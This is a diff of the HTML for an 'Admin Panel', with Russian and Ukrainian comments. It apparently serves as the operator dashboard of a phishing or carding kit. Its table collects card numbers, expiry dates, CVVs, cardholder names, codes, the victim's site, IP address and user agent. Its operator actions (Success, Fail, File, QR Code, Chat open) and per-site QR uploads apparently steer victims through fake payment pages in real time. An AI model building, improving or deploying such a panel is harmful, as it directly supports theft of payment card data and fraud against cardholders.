@@ -8,78 +8,75 @@
     <link rel="stylesheet" href="styles.css">
 </head>
 
-<body>
-    <nav class="top-nav">
-        <div class="nav-items">
-            <a href="#" class="nav-item">Формы</a>
-            <a href="#" class="nav-item">Профиль</a>
-            <a href="#" class="nav-item">Баны</a>
-            <div class="active-users">
-                <span class="icon">🔍</span>
-                <span class="count">0 активных</span>
+<body class="dark-theme">
+    <div class="container">
+        <header>
+            <h1>Admin Panel</h1>
+            <div class="actions">
+                <button id="refreshBtn">Refresh</button>
+                <div class="dropdown">
+                    <button class="dropdown-btn">Actions</button>
+                    <div class="dropdown-content">
+                        <a href="#" id="successBtn">Success</a>
+                        <a href="#" id="failBtn">Fail</a>
+                        <a href="#" id="fileBtn">File</a>
+                        <a href="#" id="qrBtn">QR Code</a>
+                        <a href="#" id="chatBtn">Chat open</a>
+                    </div>
+                </div>
+            </div>
+        </header>
+
+        <!-- Модальное окно для QR-кодов -->
+        <div id="qrModal" class="modal">
+            <div class="modal-content">
+                <span class="close">&times;</span>
+                <h2>QR Code Management</h2>
+                <div class="qr-container">
+                    <div class="qr-section">
+                        <h3>Site 1 QR Code</h3>
+                        <img id="qr1" src="/qr/1" alt="QR Code 1" onerror="this.src='placeholder.png'">
+                        <input type="file" id="qr1Upload" accept="image/*">
+                        <button onclick="uploadQR(1)">Upload New QR</button>
+                    </div>
+                    <div class="qr-section">
+                        <h3>Site 2 QR Code</h3>
+                        <img id="qr2" src="/qr/2" alt="QR Code 2" onerror="this.src='placeholder.png'">
+                        <input type="file" id="qr2Upload" accept="image/*">
+                        <button onclick="uploadQR(2)">Upload New QR</button>
+                    </div>
+                    <div class="qr-section">
+                        <h3>Site 3 QR Code</h3>
+                        <img id="qr3" src="/qr/3" alt="QR Code 3" onerror="this.src='placeholder.png'">
+                        <input type="file" id="qr3Upload" accept="image/*">
+                        <button onclick="uploadQR(3)">Upload New QR</button>
+                    </div>
+                </div>
             </div>
         </div>
-        <div class="nav-right">
-            <div class="search-box">
-                <input type="text" placeholder="Поиск...">
-                <button class="search-btn">🔍</button>
-            </div>
-            <button class="sound-btn">Звук вкл.</button>
-            <button class="always-btn">ALWAYS [disabled]</button>
-            <button class="logout-btn">Выход</button>
-        </div>
-    </nav>
 
-    <div class="sidebar">
-        <div class="actions">
-            <h3>Действия</h3>
-            <a href="#" class="action-item success">Успешно</a>
-            <a href="#" class="action-item error">Неудача</a>
-            <a href="#" class="action-item">Файл</a>
-            <a href="#" class="action-item">Карта</a>
-            <a href="#" class="action-item">QR код</a>
-            <a href="#" class="action-item">Открыть чат</a>
-        </div>
-    </div>
-
-    <main class="content">
-        <table class="cards-table">
+        <!-- Основная таблица -->
+        <table id="dataTable">
             <thead>
                 <tr>
                     <th>ID</th>
-                    <th>Срок</th>
+                    <th>CC Num</th>
+                    <th>Exp</th>
                     <th>CVV</th>
-                    <th>Держатель</th>
-                    <th>Код</th>
-                    <th>Сайт</th>
+                    <th>CardHolder</th>
+                    <th>Code</th>
+                    <th>Site</th>
                     <th>IP</th>
                     <th>UA</th>
-                    <th>Референс</th>
-                    <th>Опции</th>
+                    <th>Referer</th>
                 </tr>
             </thead>
-            <tbody id="cards-list">
-                <!-- Дані будуть додаватися через JavaScript -->
+            <tbody id="tableBody">
             </tbody>
         </table>
-    </main>
-
-    <div class="chat-container" id="chat">
-        <div class="chat-header">
-            <h3>Чат</h3>
-            <button class="close-chat">×</button>
-        </div>
-        <div class="chat-messages" id="chat-messages">
-            <!-- Повідомлення будуть додаватися через JavaScript -->
-        </div>
-        <div class="chat-input">
-            <input type="text" placeholder="Введите сообщение...">
-            <button class="send-btn">Отправить</button>
-        </div>
     </div>
 
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
-    <script src="script.js"></script>
+    <script src="admin.js"></script>
 </body>
 
 </html>
